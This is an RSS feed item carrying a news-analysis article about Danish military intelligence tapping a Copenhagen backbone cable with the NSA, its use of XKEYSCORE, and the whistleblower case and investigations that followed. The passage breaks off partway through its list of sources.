<?xml version="1.0" encoding="utf-8"?>
<?xml-stylesheet type="text/xsl" href="css/feed.xsl"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:media="http://search.yahoo.com/mrss/" xmlns:og="http://ogp.me/ns#">
<channel>
<atom:link rel="self" href="http://192.168.1.4/fivefilters/makefulltextfeed.php?url=hnrss.org%2Fnewest%3Fpoints%3D200&amp;max=10&amp;links=preserve&amp;exc=" />
<atom:link rel="alternate" title="Source URL" href="http://hnrss.org/newest?points=200" />
<atom:link rel="related" title="Subscribe to feed" href="http://www.subtome.com/#/subscribe?feeds=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D&amp;back=http%3A%2F%2F192.168.1.4%2Ffivefilters%2Fmakefulltextfeed.php%3Furl%3Dhnrss.org%252Fnewest%253Fpoints%253D200%26max%3D10%26links%3Dpreserve%26exc%3D" />
<title>Hacker News: Newest</title>
<link>https://news.ycombinator.com/newest</link>
<description>Hacker News RSS</description>
<item>
<title>Danish military intelligence uses XKEYSCORE to tap cables in co-op with the NSA</title>
<link>https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html</link>
<guid isPermaLink="true" >https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html</guid>
<description>&lt;br/&gt;Last August, it came out that a whistleblower accused the Danish military and signals intelligence service (&lt;a href=&quot;https://en.wikipedia.org/wiki/Danish_Defence_Intelligence_Service&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;Forsvarets Efterretningstjeneste&lt;/em&gt;&lt;/a&gt; or FE) of unlawful activities and deliberately misleading the intelligence oversight board.&lt;p&gt;Meanwhile, the Danish press was able to paint a surprisingly comprehensive and detailed picture of how the FE cooperated with the NSA in &lt;a href=&quot;https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html#cabletapping&quot;&gt;&lt;strong&gt;cable tapping&lt;/strong&gt;&lt;/a&gt; on Danish soil.&lt;/p&gt;&lt;p&gt;It was further revealed that the Americans provided Denmark with a sophisticated &lt;a href=&quot;https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html#spysystem&quot;&gt;&lt;strong&gt;new spy system&lt;/strong&gt;&lt;/a&gt; which includes the NSA's data processing system &lt;a href=&quot;https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html#xkeyscore&quot;&gt;&lt;strong&gt;XKEYSCORE&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;A Danish paper also disclosed that the accusation of &lt;a href=&quot;https://www.electrospaces.net/2020/10/danish-military-intelligence-uses.html#unlawful&quot;&gt;&lt;strong&gt;unlawful collection&lt;/strong&gt;&lt;/a&gt; came from a young FE employee who reminds of Edward Snowden. A newly established investigation commission now has to clarify whether he was driven by fears or by facts.&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-FEhoYi_a0EI/X3lHJbfeSlI/AAAAAAAAEyk/urOidzARWswgJstbeNFiU8CRo38JQMufACPcBGAYYCw/s800/fe-xks-header.jpg&quot;&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot; data-original-height=&quot;420&quot; data-original-width=&quot;800&quot; src=&quot;https://1.bp.blogspot.com/-FEhoYi_a0EI/X3lHJbfeSlI/AAAAAAAAEyk/urOidzARWswgJstbeNFiU8CRo38JQMufACPcBGAYYCw/s800/fe-xks-header.jpg&quot; width=&quot;600&quot;/&gt;&lt;/a&gt;&lt;/div&gt;&lt;div align=&quot;center&quot;&gt;&lt;span&gt;The Sandagergård complex of the FE on the island of Amager, where a new&lt;br/&gt;data center was built for its deployment of the XKEYSCORE system&lt;br/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;Cable tapping&lt;/span&gt;&lt;/p&gt;&lt;p&gt;In an extensive piece from September 13, the renowned Danish newspaper &lt;a href=&quot;https://www.berlingske.dk/samfund/et-pengeskab-paa-kastellet-har-i-aartier-gemt-paa-et-dybt-fortroligt&quot; target=&quot;_blank&quot;&gt;&lt;em&gt;Berlingske&lt;/em&gt;&lt;/a&gt; (founded in 1749) describes how the FE, in cooperation with the NSA, started to tap an international telecommunications cable in order to gather foreign intelligence.&lt;/p&gt;&lt;p&gt;In the mid-1990s, the NSA had found out that somewhere under Copenhagen there was a backbone cable containing phone calls, e-mails and text messages from and to countries like China and Russia, which was of great interest for the Americans.&lt;/p&gt;&lt;p&gt;Tapping that cable, however, was almost impossible without the help of the Danes, so the NSA asked the FE for access to the cable, but this request was denied, according to Berlingske.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Agreement with the United States&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The US government did not give up, and in a letter sent directly to the Danish prime minister Poul Nyrup Rasmussen, US president Clinton asked his Danish colleague to reconsider the decision. And Nyrup, who was a sworn supporter of a close relationship with the US, said yes.&lt;/p&gt;&lt;p&gt;The cooperation was laid down in a document, which, according to Berlingske, all Danish defense ministers had to sign &quot;so that any new minister could see that his predecessor - and his predecessors before his predecessors - with their signatures had been part of this small, exclusive circle of people who knew one of the kingdom's biggest secrets.&quot;&lt;/p&gt;&lt;p&gt;The code name for this cooperation is not known, but it's most likely part of the NSA's umbrella program &lt;a href=&quot;https://www.electrospaces.net/2014/10/the-german-operation-eikonal-as-part-of.html#rampart-a&quot;&gt;RAMPART-A&lt;/a&gt;. Under this program, which started in 1992, foreign partners &lt;a href=&quot;https://s3.amazonaws.com/s3.documentcloud.org/documents/1200864/tssinframpartaoverview-v1-0-redacted-information.pdf&quot; target=&quot;_blank&quot;&gt;provide&lt;/a&gt; access to high-capacity international fiber-optic cables, while the US provides the equipment for transport, processing and analysis:&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-VQv_x5OW4VM/VD2MIOzUWkI/AAAAAAAAB8o/rxZgVvQ4hmI/s1600/rampart-a-2010-diagram.jpg&quot; imageanchor=&quot;1&quot; target=&quot;_blank&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://1.bp.blogspot.com/-VQv_x5OW4VM/VD2MIOzUWkI/AAAAAAAAB8o/rxZgVvQ4hmI/s1600/rampart-a-2010-diagram.jpg&quot; title=&quot;Slide from an NSA presentation about the RAMPART-A program&quot; width=&quot;450&quot;/&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;Agreement with a cable operator&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;To make sure that tapping the cable was as legal as possible, the government asked approval of the private Danish company that operated the cable. The company agreed, but only when it was approved at the highest level, and so the agreement was signed by prime minister Rasmussen, minister of defense Hækkerup and head of department Troldborg.&lt;/p&gt;&lt;p&gt;Because the cable contained international telecommunications it was considered to fall within the FE's foreign intelligence mandate. The agreement was prepared in only one copy, which was shown to the company and then locked in a safe at the FE's headquarters at the &lt;a href=&quot;https://web.archive.org/web/20200811152740/https://fe-ddis.dk/om-os/Organisation/lokaliteter-i-dk/Pages/Kastellet.aspx&quot; target=&quot;_blank&quot;&gt;Kastellet&lt;/a&gt; fortress in Copenhagen, according to Berlingske.&lt;/p&gt;&lt;p&gt;This Danish agreement is very similar to the &lt;a href=&quot;http://download.krone.at/pdf/VertragWZschwarz.pdf&quot; target=&quot;_blank&quot;&gt;Transit Agreement&lt;/a&gt; between the German foreign intelligence service BND and Deutsche Telekom, in which the latter agreed to provide access to international transit cables at its switching center in Frankfurt am Main. The BND then tapped these cables with help from the NSA under &lt;a href=&quot;https://www.electrospaces.net/2015/05/new-details-about-joint-nsa-bnd.html&quot;&gt;operation Eikonal&lt;/a&gt; (2004-2008).&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Processing at Sandagergård&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Berlingske reported that the communications data that were extracted from the backbone cable in Copenhagen were sent from the Danish company's technical hub to the &lt;a href=&quot;https://web.archive.org/web/20200811153920/https://fe-ddis.dk/om-os/Organisation/lokaliteter-i-dk/Pages/Sandagergaard.aspx&quot; target=&quot;_blank&quot;&gt;Sandagergård complex&lt;/a&gt; of the FE on the island of &lt;a href=&quot;https://en.wikipedia.org/wiki/Amager&quot; target=&quot;_blank&quot;&gt;Amager&lt;/a&gt;. The US had paid for a cable between the two locations.&lt;/p&gt;&lt;p&gt;At Sandagergård, the &quot;NSA made sure to install the technology that made it possible to enter keywords and translate the huge amount of information, so-called raw data from the cable tapping, into &quot;readable&quot; information.&quot;&lt;/p&gt;&lt;p&gt;The filter system was not only fed by keywords from the FE, but the NSA also provided &quot;the FE with a series of keywords that are relevant to the United States. The FE then reviews them - and checks that there are basically no Danes among them - and then enters the keywords&quot; according to sources cited by Berlingske.&lt;/p&gt;&lt;p&gt;Besides this filtering with keywords and selectors, the FE and the NSA will also have used the metadata for &lt;a href=&quot;https://edwardsnowden.com/docs/doc/B17-TDB-Knowledge-Sharing.pdf&quot; target=&quot;_blank&quot;&gt;contact-chaining&lt;/a&gt;, which means reconstructing which phone numbers and e-mail addresses had been in contact with each other, in order to create social network graphs - something the sources apparently didn't want to disclose to Berlingske.&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-zFJ49f56CXY/X5PXqIaouqI/AAAAAAAAEzY/TJwURx3Jn6oCxN9s4I3LqKKu1EhtLPEAACPcBGAYYCw/s1351/dk-cables.JPG&quot;&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot; data-original-height=&quot;830&quot; data-original-width=&quot;1351&quot; src=&quot;https://1.bp.blogspot.com/-zFJ49f56CXY/X5PXqIaouqI/AAAAAAAAEzY/TJwURx3Jn6oCxN9s4I3LqKKu1EhtLPEAACPcBGAYYCw/s1351/dk-cables.JPG&quot; width=&quot;550&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div align=&quot;center&quot;&gt;&lt;span&gt;Map of the current backbone cables around the Danish capital Copenhagen&lt;br/&gt;and the Sandagergård complex of the FE on the island of Amager&lt;br/&gt;(source: &lt;a href=&quot;https://live.infrapedia.com/app&quot; target=&quot;_blank&quot;&gt;Infrapedia&lt;/a&gt; - click to enlarge)&lt;br/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Trusted partners&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Part of the agreement between the US and Denmark was that &quot;the USA does not use the system against Danish citizens and companies. And the other way around&quot;. Similar words can be found in an &lt;a href=&quot;https://www.documentcloud.org/documents/1200860-odd-s3-overviewnov2011-v1-0-redacted-information.html&quot; target=&quot;_blank&quot;&gt;NSA presentation&lt;/a&gt; from 2011: &quot;No US collection by Partner and No Host Country collection by US&quot; - although this is followed by &quot;there ARE exceptions!&quot;&lt;/p&gt;&lt;p&gt;The latter remark may have inspired Edward Snowden to accuse the NSA of abusing these cooperations with foreign partner agencies to spy on European citizens, but as a source told Berlingske:&lt;/p&gt;&lt;p&gt;&quot;I can not at all imagine in my imagination that the NSA would betray that trust. I consider it completely and utterly unlikely. If the NSA had a desire to obtain information about Danish citizens or companies, the United States would simply turn to [the domestic security service] PET, which would then provide the necessary legal basis.&quot;&lt;/p&gt;&lt;p&gt;The source also said that &quot;the NSA wanted to jump and run for Denmark. The agency did everything Denmark asked for, without discussion. The NSA continuously helped Denmark - because of this cable access. [...] Denmark was a very, very close and valued partner.&quot;&lt;/p&gt;&lt;p&gt;This close and successful cooperation was apparently one of the reasons for the visit of president Bill Clinton to Denmark in July 1997, according to Berlingske.&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-1-v3T8EQqk0/X3gIQLWgChI/AAAAAAAAEyE/j-yGk3qiStcS3Y692bc25UT6WG1_B_2BACLcBGAsYHQ/s0/clinton-rasmussen.jpg&quot;&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot; src=&quot;https://1.bp.blogspot.com/-1-v3T8EQqk0/X3gIQLWgChI/AAAAAAAAEyE/j-yGk3qiStcS3Y692bc25UT6WG1_B_2BACLcBGAsYHQ/s0/clinton-rasmussen.jpg&quot; width=&quot;550&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div align=&quot;center&quot;&gt;&lt;span&gt;Danish prime minister Poul Nyrup Rasmussen and US president Bill Clinton&lt;br/&gt;during his visit to Denmark in July 1997 (photo: Linda Kastrup)&lt;br/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;A new spy system&lt;/span&gt;&lt;/p&gt;&lt;p&gt;In the wake of the FE scandal even more recent developments have been revealed: a &lt;a href=&quot;https://www.dr.dk/nyheder/indland/ny-afsloering-fe-masseindsamler-oplysninger-om-danskere-gennem-avanceret-spionsystem&quot; target=&quot;_blank&quot;&gt;report&lt;/a&gt; by the Danish broadcaster DR from September 24, 2020 provides interesting details about how the Americans provided Denmark with a sophisticated new &quot;spy system&quot;.&lt;/p&gt;&lt;p&gt;After the FE got a new head of procurement in 2008, NSA employees frequently traveled to Denmark for quite some time to build the necessary hardware and install the required software for the new system, which DR News describes as extremely advanced. It also has a special internal code name, which the broadcaster decided not to publish. It's also this new system through which the alleged illegal collection of Danish data took place.&lt;/p&gt;&lt;p&gt;According to DR News, the NSA technicians were also involved in the construction of a new data center at the FE's &lt;a href=&quot;https://web.archive.org/web/20200811153920/https://fe-ddis.dk/om-os/Organisation/lokaliteter-i-dk/Pages/Sandagergaard.aspx&quot; target=&quot;_blank&quot;&gt;Sandagergård complex&lt;/a&gt; on Amager that was specifically built to house the new spy system, which was taken into use somewhere between 2012 and 2014. The cooperation between the FE and the NSA on this specific system was based upon a Memorandum of Understanding (MoU) signed by then FE chief &lt;a href=&quot;https://da.wikipedia.org/wiki/Thomas_Ahrenkiel&quot; target=&quot;_blank&quot;&gt;Thomas Ahrenkiel&lt;/a&gt;.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Filter systems&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;The DR News &lt;a href=&quot;https://www.dr.dk/nyheder/indland/ny-afsloering-fe-masseindsamler-oplysninger-om-danskere-gennem-avanceret-spionsystem&quot; target=&quot;_blank&quot;&gt;report&lt;/a&gt; also goes into more detail about the interception process. It says that first, the intelligence service identifies a data stream that may be interesting, after which they &quot;mirror&quot; the light that passes through the particular fiber-optic cables. In this way, they copy both metadata and content, like text messages, chat conversations, phone calls and e-mails, and send them to the FE's data center at Sandagergård.&lt;/p&gt;&lt;p&gt;According to DR News, the FE tried to develop a number of filters to ensure that data from Danish citizens and companies is sorted out and not made searchable by the new spy system. The former Danish minister of defense Claus Hjort Frederiksen recently &lt;a href=&quot;http://www.weekendavisen.dk/2020-37/samfund/landsskadeligt&quot; target=&quot;_blank&quot;&gt;said&lt;/a&gt; that there was indeed an attempt to develop such filters, but at the same time he admitted that there can be no guarantee that no Danish information will pass through.&lt;/p&gt;&lt;p&gt;&lt;span&gt;XKEYSCORE&lt;/span&gt;&lt;/p&gt;&lt;p&gt;DR News also reported that the heart of the new spy system is formed by &lt;a href=&quot;https://en.wikipedia.org/wiki/XKeyscore&quot; target=&quot;_blank&quot;&gt;XKEYSCORE&lt;/a&gt;, which was developed by the NSA and the existence of which was first &lt;a href=&quot;https://www.theguardian.com/world/2013/jul/31/nsa-top-secret-program-online-data&quot; target=&quot;_blank&quot;&gt;revealed&lt;/a&gt; by The Guardian in June 2013.&lt;/p&gt;&lt;p&gt;The NSA's British counterpart GCHQ incorporated XKEYSCORE in its own system for processing bulk internet data codenamed &lt;a href=&quot;https://en.wikipedia.org/wiki/Tempora&quot; target=&quot;_blank&quot;&gt;TEMPORA&lt;/a&gt; and it can be assumed that the other &lt;a href=&quot;https://www.electrospaces.net/2014/09/nsas-foreign-partnerships.html#2ndparty&quot;&gt;Second Party&lt;/a&gt; partners (also known as the Five Eyes) also use this system, whether or not under a different codename.&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-t6LWjnPz3Wo/X3LLi61rZzI/AAAAAAAAExc/-F5vREaIi4oBCAZ_LNhvOOJFVnHnLlFbgCLcBGAsYHQ/s0/xks%2Bintro.JPG&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot; src=&quot;https://1.bp.blogspot.com/-t6LWjnPz3Wo/X3LLi61rZzI/AAAAAAAAExc/-F5vREaIi4oBCAZ_LNhvOOJFVnHnLlFbgCLcBGAsYHQ/s0/xks%2Bintro.JPG&quot; width=&quot;500&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;From the Snowden documents we know that the NSA also provided XKEYSCORE to some of its &lt;a href=&quot;https://www.electrospaces.net/2014/09/nsas-foreign-partnerships.html#3rdparty&quot;&gt;Third Party&lt;/a&gt; partners: the German &lt;a href=&quot;https://www.electrospaces.net/2016/09/secret-report-reveals-german-bnd-also.html&quot;&gt;foreign intelligence service BND&lt;/a&gt; and domestic security service BfV, the Swedish signals intelligence service FRA and the Japanese Directorate for SIGINT. It is new though that the Danish military intelligence service FE uses the system too.&lt;/p&gt;&lt;p&gt;Some press reports seem to suggest that these partner agencies &quot;gain access to XKEYSCORE&quot; as if it would allow them to connect to a huge global mass surveillance system. The latter may be the case for the NSA's Second Party partners, but the Third Party partners are using XKEYSCORE only to process and analyze data from their own tapping points and are not able to access data from Five Eyes collection platforms.&lt;/p&gt;&lt;p&gt;Likewise, NSA analysts using XKEYSCORE don't have direct access to, in this case, Danish collection systems, only to data that the Danes agreed to share with the US as &quot;3rd party collection&quot;.&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-pke0UNrwbKc/X3d145ragAI/AAAAAAAAEx4/JhND-5UxOWgKBVyZebY8SJ-oH2BBIC4JgCLcBGAsYHQ/s0/xks-access.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot; src=&quot;https://1.bp.blogspot.com/-pke0UNrwbKc/X3d145ragAI/AAAAAAAAEx4/JhND-5UxOWgKBVyZebY8SJ-oH2BBIC4JgCLcBGAsYHQ/s0/xks-access.jpg&quot; width=&quot;500&quot;/&gt;&lt;/a&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;How XKEYSCORE works&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Glenn Greenwald &lt;a href=&quot;https://www.theguardian.com/world/2013/jul/31/nsa-top-secret-program-online-data&quot; target=&quot;_blank&quot;&gt;presented&lt;/a&gt; XKEYSCORE as the NSA's &quot;widest-reaching&quot; tool to collect &quot;nearly everything a user does on the internet&quot;. This is misleading, because it's more about quality than about quantity: the system actually &lt;a href=&quot;http://www.spiegel.de/media/media-34077.pdf&quot; target=&quot;_blank&quot;&gt;helps&lt;/a&gt; analysts to &quot;downsize their gigantic shrimping nets [of traditional collection methods] to tiny goldfish-sized nets and merely dip them into the oceans of data, working smarter and scooping out exactly what they want&quot;.&lt;/p&gt;&lt;p&gt;The NSA has XKEYSCORE installed at some 150 data collection sites all over the world. There, it creates a rolling buffer of 3 to 5 days of content and around 30 days of metadata, which can be remotely searched by analysts. They can use traditional selectors like phone numbers and e-mail addresses to pick out data of interest, but that's the old way and how other agencies perform bulk collection.&lt;/p&gt;&lt;p&gt;Filtering phone numbers and e-mail addresses became less useful because targets know that this happens and shifted to anonymous ways to communicate over the internet. The novelty of XKEYSCORE is that it &lt;a href=&quot;http://www.theguardian.com/world/interactive/2013/jul/31/nsa-xkeyscore-program-full-presentation&quot; target=&quot;_blank&quot;&gt;enables&lt;/a&gt; analysts to find exactly those anonymous communications. For that purpose it reassembles IP packets into their original format (&quot;sessionizing&quot;), like Word documents, spreadsheets, chat messages, etc.&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-Tc8m5jnQq4U/V94rPvBu57I/AAAAAAAADLQ/c5-CNrQkgNoMak0AVOUWi5fAxfzQ6JCZwCLcB/s1600/xkeyscore-deepdive.jpg&quot; imageanchor=&quot;1&quot; target=&quot;_blank&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://2.bp.blogspot.com/-Tc8m5jnQq4U/V94rPvBu57I/AAAAAAAADLQ/c5-CNrQkgNoMak0AVOUWi5fAxfzQ6JCZwCLcB/s1600/xkeyscore-deepdive.jpg&quot; width=&quot;500&quot;/&gt;&lt;/a&gt;&lt;br/&gt;&lt;span&gt;Diagram showing the dataflow for the &lt;a href=&quot;https://theintercept.com/document/2015/07/01/deepdive-readme/&quot; target=&quot;_blank&quot;&gt;DeepDive&lt;/a&gt; version of XKEYSCORE&lt;br/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;Once restored, these files can be searched for characteristics that are related to certain targets or target groups, like use of encryption, the use of the TOR network, the use of a different language than where someone is located, and many combinations thereof. In this way, analysts can discover new targets and then start monitoring them more closely.&lt;/p&gt;&lt;p&gt;XKEYSCORE was also mentioned in a classified &lt;a href=&quot;https://wikileaks.org/bnd-inquiry/docs/BND/MAT%20A%20BND-1-13b.pdf&quot; target=&quot;_blank&quot; title=&quot;See pdf-pages 84 and 85&quot;&gt;file&lt;/a&gt; from the German BND, which contains a diagram that shows the difference between XKEYSCORE and traditional collection systems: in the traditional set-up, IP packets from a data stream were reassembled and then went through a filter to select only those of interest, which were forwarded for further analysis. XKEYSCORE could do all that at once:&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://2.bp.blogspot.com/-JZYsQv5Waws/WGNMaNGlBVI/AAAAAAAADW4/iiZk4fxoJsAofX4YO21WLyMoxpzJbN8pACLcB/s1600/nsaua-bnd-xks-diagram1.jpg&quot; imageanchor=&quot;1&quot; target=&quot;_blank&quot;&gt;&lt;img border=&quot;0&quot; src=&quot;https://2.bp.blogspot.com/-JZYsQv5Waws/WGNMaNGlBVI/AAAAAAAADW4/iiZk4fxoJsAofX4YO21WLyMoxpzJbN8pACLcB/s1600/nsaua-bnd-xks-diagram1.jpg&quot; title=&quot;How the XKEYSCORE system is used by BND&quot; width=&quot;500&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;Unlawful collection?&lt;/span&gt;&lt;/p&gt;&lt;p&gt;Now that the various disclosures by the Danish press provided quite some insight into the FE's cable tapping activities, how about the abuses it's accused of?&lt;/p&gt;&lt;p&gt;According to DR News, it was the newly installed spy system through which the alleged illegal collection of Danish data took place. In the first place we can assume that the filters were not able to block all the communications related to Danish citizens, residents or companies, but this is of a technical nature and not intentional.&lt;/p&gt;&lt;p&gt;Another option is that the FE itself, or the NSA fed the system with selectors (like phone numbers and e-mail addresses) that would result in the collection of Danish data. The NSA would not have been allowed to do that under the agreement with the Danes, while for the FE this would be against the law.&lt;/p&gt;&lt;p&gt;According to a source cited in the aforementioned Berlingske newspaper &lt;a href=&quot;https://www.berlingske.dk/samfund/et-pengeskab-paa-kastellet-har-i-aartier-gemt-paa-et-dybt-fortroligt&quot; target=&quot;_blank&quot;&gt;article&lt;/a&gt;, there was one case in which &quot;the NSA sent a request to search for a company in a country in Asia, but when the FE checked the selector, it discovered that the company was Danish-owned, whereupon the request was rejected&quot;.&lt;/p&gt;&lt;p&gt;This shows that, just like it was the case in Germany, the NSA's interest was quite &quot;broad&quot;, but that the FE did its best to protect Danish subjects and blocked such requests where possible.&lt;/p&gt;&lt;p&gt;A third option is that the illegal collection took place through the additional data search capabilities of the XKEYSCORE system, which is imaginable because here the search criteria are applied to characteristics of the content of the communications, instead of the people who are involved.&lt;/p&gt;&lt;p&gt;According to Berlingske, the whistleblower who informed the intelligence oversight board &quot;feared that the management of the Defense Intelligence Service was doing US business by leaving its special system with technical vulnerabilities that allowed the National Security Agency to abuse it.&quot;&lt;/p&gt;&lt;p&gt;&lt;br/&gt;&lt;strong&gt;The whistleblower&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Berlingske was also able to identify the whistleblower as a younger employee of the FE, working as an IT specialist - a striking similarity to Edward Snowden. The paper says that in 2013 he became increasingly concerned, but it's not clear whether this may have been caused by the Snowden revelations, which started in June of that year and included reports about XKEYSCORE, the system that had just been installed at the FE.&lt;/p&gt;&lt;p&gt;As the IT specialist insisted on his criticism, then head of the FE Thomas Ahrenkiel decided - without informing the Americans - to set up a technical working group to go through the system looking for vulnerabilities or signs of abuse by NSA. As reported by Berlingske, the IT specialist himself, with the aim of reassuring him, also participated in the working group, which in 2014 concluded that there were no signs of illegal intrusion.&lt;/p&gt;&lt;p&gt;For the FE the case was closed, but, as reported by Berlingske, the IT specialist was not satisfied and &quot;he made a drastic decision and smuggled a recorder into his workplace, arranged meetings with colleagues and bosses for several months and recorded them in secret&quot; - again a kind of persistance very similar to &lt;a href=&quot;https://www.electrospaces.net/2019/12/review-of-snowdens-book-permanent.html&quot;&gt;how Snowden operated&lt;/a&gt;. But unlike Snowden, the Danish whistleblower did not contact the press, but eventually informed the intelligence oversight board.&lt;/p&gt;&lt;div class=&quot;separator&quot;&gt;&lt;a href=&quot;https://1.bp.blogspot.com/-ONClopLwJbU/X5PY7vjvSNI/AAAAAAAAEzg/g34PNcDLqE4gQ9_hdStPNB-tOAR99_c3wCLcBGAsYHQ/s0/dk-defense-ministers.jpg&quot; target=&quot;_blank&quot;&gt;&lt;img alt=&quot;&quot; border=&quot;0&quot; src=&quot;https://1.bp.blogspot.com/-ONClopLwJbU/X5PY7vjvSNI/AAAAAAAAEzg/g34PNcDLqE4gQ9_hdStPNB-tOAR99_c3wCLcBGAsYHQ/s0/dk-defense-ministers.jpg&quot; width=&quot;500&quot;/&gt;&lt;/a&gt;&lt;/div&gt;
&lt;div align=&quot;center&quot;&gt;&lt;span&gt;Danish defense minister Trine Bramsen (left) and her predecessor&lt;br/&gt;Claus Hjort Frederiksen (photo: Linda Kastrup/Scanpix)&lt;br/&gt;&lt;/span&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;Investigations&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Berlingske reported that the recordings provided &quot;hours of covert footage with employees of the service, some of which [...] have expressed themselves in a way that confirms the suspicion that the FE may have acted illegally and not intervened adequately to prevent data on Danes from being disclosed.&quot; In November 2019 they were handed over to the intelligence oversight board, which in December informed defense minister Trine Bramsen.&lt;/p&gt;&lt;p&gt;Unlike her predecessor, Bramsen apparently took these kind of accusations very seriously and urged the oversight board to conduct an investigation, which on August 24, 2020 resulted in the &lt;a href=&quot;https://www.electrospaces.net/2020/08/head-of-danish-military-intelligence.html&quot;&gt;sudden suspension of the head of the FE&lt;/a&gt; and a few other officials (meanwhile they have &lt;a href=&quot;https://www.dr.dk/nyheder/indland/spionageskandalen-fem-hjemsendte-medarbejdere-faar-lov-til-arbejde-igen&quot; target=&quot;_blank&quot;&gt;returned&lt;/a&gt; again, but in other positions).&lt;/p&gt;&lt;p&gt;On October 5, the Danish government &lt;a href=&quot;https://www.ft.dk/samling/20191/almdel/fou/bilag/125/2256092/index.htm&quot; target=&quot;_blank&quot;&gt;decided&lt;/a&gt; to submit a bill to establish a special commission that has to carry out an independent and impartial investigation into the accusations against the FE, which has to present a report within a year.&lt;/p&gt;&lt;p&gt;&lt;span&gt;Conclusion&lt;/span&gt;&lt;/p&gt;&lt;p&gt;In 2013, a young IT specialist at the FE became worried that this intelligence service could have illegally spied on Danish citizens. This was not only in accordance with Snowden's (unsubstantiated) narrative, but also a fear that had &lt;a href=&quot;https://www.berlingske.dk/samfund/et-pengeskab-paa-kastellet-har-i-aartier-gemt-paa-et-dybt-fortroligt&quot; target=&quot;_blank&quot;&gt;lived&lt;/a&gt; in Denmark since its domestic security service PET had been &lt;a href=&quot;https://da.wikipedia.org/wiki/Politiets_Efterretningstjeneste#PET_kommission&quot; target=&quot;_blank&quot;&gt;accused&lt;/a&gt; of monitoring ordinary Danes in 1998.&lt;/p&gt;&lt;p&gt;Meanwhile it has turned out that Snowden was &lt;a href=&quot;https://www.electrospaces.net/2020/03/edward-snowden-and-stellarwind-report.html#conclusion&quot;&gt;driven more by fears&lt;/a&gt; than by facts - could that also have been the case with the FE whistleblower? Based on what has been published so far, he apparently tried to find evidence even after an internal investigation concluded that the NSA wasn't abusing the FE's collection system.&lt;/p&gt;&lt;p&gt;In recent years, the NSA and the German BND have also been accused of massive illegal domestic spying. Thorough investigations have shown that was not the case, although their employees were sometimes careless and it was technically not always possible to do what was legally required.&lt;/p&gt;&lt;p&gt;Was this also the situation at the Danish military intelligence service? The recently established investigation commission will show.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Links &amp;amp; sources&lt;/strong&gt;&lt;br/&gt;&lt;span&gt;&lt;br/&gt;- Berlingske: &lt;a href=&quot;https://www.berlingske.dk/samfund/saerlig-undersoegelseskommission-skal-kulegrave-fe-sagen&quot; target=&quot;_blank&quot;&gt;Særlig undersøgelseskommission skal kulegrave FE-sagen&lt;/a&gt; (Oct. 5, 2020)&lt;br/&gt;- Politiken: &lt;a href=&quot;https://politiken.dk/indland/art7942774/Debat-om-kabelaflytning-gav-t%C3%A5rer-i-Sverige-og-folkeafstemning-i-Holland?shareToken=SbAeJsAAT4vg&quot; target=&quot;_blank&quot;&gt;Debat om kabelaflytning gav tårer i Sverige og folkeafstemning i Holland&lt;/a&gt; (Oct. 1, 2020)&lt;br/&gt;- DR News: &lt;a href=&quot;https://www.dr.dk/nyheder/indland/ny-afsloering-fe-masseindsamler-oplysninger-om-danskere-gennem-avanceret-spionsystem&quot; target=&quot;_blank&quot;&gt;Ny 